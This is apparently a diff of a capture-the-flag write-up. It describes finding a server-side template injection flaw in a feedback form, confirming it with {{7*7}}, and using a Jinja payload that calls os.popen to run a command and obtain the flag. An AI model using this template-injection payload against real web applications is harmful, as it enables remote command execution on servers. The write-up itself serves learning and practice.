@@ -198,9 +198,9 @@ Provided with url with port `8002`. It show an images of cookies and mention abo
 Provided with URL. It have feedback form. At first i thought it was XSS but there is no bot visiting this page make XSS useless. Next, i notice on webpage being rendered on whatever we send.
 It might use render template at back and might be injected with SSTI.
 Trying simple payload to proof it
-`{{7*7}]` and it return `49` proof that it vulnerable. 
+```{{7*7}}``` and it return `49` proof that it vulnerable. 
 using this payload to get the flag.
-`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('/fag.txt').read() }}`
+```{{ self.__init__.__globals__.__builtins__.__import__('os').popen('/fag.txt').read() }}```
 
 ==CURTIN_CTF{t3mpl4t3s_ar3_e4sy_t0_cr4ck}==
 
